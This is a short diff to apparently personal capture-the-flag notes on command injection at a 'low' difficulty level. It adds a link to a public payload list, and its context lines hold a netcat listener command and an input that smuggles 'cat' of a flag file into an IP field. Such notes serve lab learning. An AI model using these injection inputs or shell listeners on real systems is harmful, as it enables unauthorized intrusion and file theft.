@@ -9,6 +9,8 @@ LOW DIFF.
 start a listener with nc -lnvp 9001 on the attacker
 127.0.0.1 | cat /home/tryhackme/flag.txt
 
+PAYLOAD LIST LINK https://github.com/payloadbox/command-injection-payload-list
+
 
 
 MEDIUM DIFF.
